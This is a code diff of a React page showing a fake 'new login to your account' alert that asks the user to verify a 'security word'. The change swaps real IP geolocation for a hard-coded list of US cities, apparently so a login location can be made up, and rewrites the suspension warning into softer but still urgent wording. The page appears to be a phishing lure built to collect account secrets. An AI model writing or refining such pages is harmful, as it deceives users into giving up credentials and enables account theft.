@@ -9,36 +9,111 @@ import React, { useEffect, useState } from "react";
 const Page = () => {
   const [securityWord, setSecurityWord] = useState("");
   const [loading, setLoading] = useState(false);
-  const [locationLoading, setLocationLoading] = useState(true);
-  const [userLocation, setUserLocation] = useState("Detecting location...");
+  const [userLocation, setUserLocation] = useState("");
   const router = useRouter();
 
   // --------------- Detect User's City + State ---------------
-  useEffect(() => {
-    const fetchLocation = async () => {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-
-        if (data && (data.city || data.region)) {
-          const city = data.city || "";
-          const region = data.region || "";
-          const locationText =
-            city && region ? `${city}, ${region}` : region || city;
-          setUserLocation(locationText);
-        } else {
-          setUserLocation("Unknown Location");
-        }
-      } catch (err) {
-        console.error("⚠️ Location fetch failed:", err);
-        setUserLocation("Unknown Location");
-      } finally {
-        setLocationLoading(false);
-      }
-    };
-
-    fetchLocation();
-  }, []);
+  const locations = [
+    "Birmingham, Alabama",
+    "Anchorage, Alaska",
+    "Phoenix, Arizona",
+    "Little Rock, Arkansas",
+    "Los Angeles, California",
+    "San Diego, California",
+    "Denver, Colorado",
+    "Bridgeport, Connecticut",
+    "Wilmington, Delaware",
+    "Miami, Florida",
+    "Orlando, Florida",
+    "Atlanta, Georgia",
+    "Honolulu, Hawaii",
+    "Boise, Idaho",
+    "Chicago, Illinois",
+    "Indianapolis, Indiana",
+    "Des Moines, Iowa",
+    "Wichita, Kansas",
+    "Louisville, Kentucky",
+    "New Orleans, Louisiana",
+    "Portland, Maine",
+    "Baltimore, Maryland",
+    "Boston, Massachusetts",
+    "Detroit, Michigan",
+    "Minneapolis, Minnesota",
+    "Jackson, Mississippi",
+    "Kansas City, Missouri",
+    "Billings, Montana",
+    "Omaha, Nebraska",
+    "Las Vegas, Nevada",
+    "Manchester, New Hampshire",
+    "Newark, New Jersey",
+    "Albuquerque, New Mexico",
+    "New York, New York",
+    "Charlotte, North Carolina",
+    "Fargo, North Dakota",
+    "Columbus, Ohio",
+    "Oklahoma City, Oklahoma",
+    "Portland, Oregon",
+    "Philadelphia, Pennsylvania",
+    "Providence, Rhode Island",
+    "Charleston, South Carolina",
+    "Sioux Falls, South Dakota",
+    "Nashville, Tennessee",
+    "Dallas, Texas",
+    "Houston, Texas",
+    "Austin, Texas",
+    "Salt Lake City, Utah",
+    "Burlington, Vermont",
+    "Richmond, Virginia",
+    "Virginia Beach, Virginia",
+    "Seattle, Washington",
+    "Spokane, Washington",
+    "Charleston, West Virginia",
+    "Madison, Wisconsin",
+    "Milwaukee, Wisconsin",
+    "Cheyenne, Wyoming",
+    "Tampa, Florida",
+    "Jacksonville, Florida",
+    "Fort Worth, Texas",
+    "San Antonio, Texas",
+    "Cleveland, Ohio",
+    "Cincinnati, Ohio",
+    "Pittsburgh, Pennsylvania",
+    "Buffalo, New York",
+    "Raleigh, North Carolina",
+    "Greensboro, North Carolina",
+    "St. Louis, Missouri",
+    "Memphis, Tennessee",
+    "Knoxville, Tennessee",
+    "Tulsa, Oklahoma",
+    "Eugene, Oregon",
+    "Tacoma, Washington",
+    "Mesa, Arizona",
+    "Scottsdale, Arizona",
+    "Tucson, Arizona",
+    "Sacramento, California",
+    "San Jose, California",
+    "Fresno, California",
+    "Oakland, California",
+    "Aurora, Colorado",
+    "Savannah, Georgia",
+    "Athens, Georgia",
+    "Springfield, Illinois",
+    "Peoria, Illinois",
+    "Evansville, Indiana",
+    "Cedar Rapids, Iowa",
+    "Topeka, Kansas",
+    "Lexington, Kentucky",
+    "Baton Rouge, Louisiana",
+    "Shreveport, Louisiana",
+    "Rockville, Maryland",
+    "Worcester, Massachusetts",
+    "Grand Rapids, Michigan",
+    "Rochester, Minnesota",
+    "Gulfport, Mississippi",
+    "Lincoln, Nebraska",
+    "Reno, Nevada",
+    "Santa Fe, New Mexico"
+  ];
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -67,10 +142,10 @@ const Page = () => {
           <p className="text-sm text-gray-700 mb-6 leading-relaxed">
             We recently noticed a new login to your account from{" "}
             <span className="font-semibold">
-              {locationLoading ? "Detecting location..." : userLocation}
+            {userLocation}
             </span>
-            . If this was you, please verify your security word to continue
-            using your account without interruption.
+            . If this was you, confirm to keep your account secure. If not, 
+            review your account immediately.
           </p>
 
           <form onSubmit={handleSubmit}>
@@ -107,9 +182,9 @@ const Page = () => {
           </form>
 
           <p className="text-xs text-gray-600 leading-relaxed">
-            If you don’t confirm within 24 hours, we’ll limit and suspend your
-            account. We apologize for any inconvenience caused by our security
-            measures.
+            If confirmation is not completed, certain account features may be temporarily
+            unavailable until your account information has been confirmed. We appreciate your
+            cooperation and apologize for any inconvenience.
           </p>
         </div>
       </div>
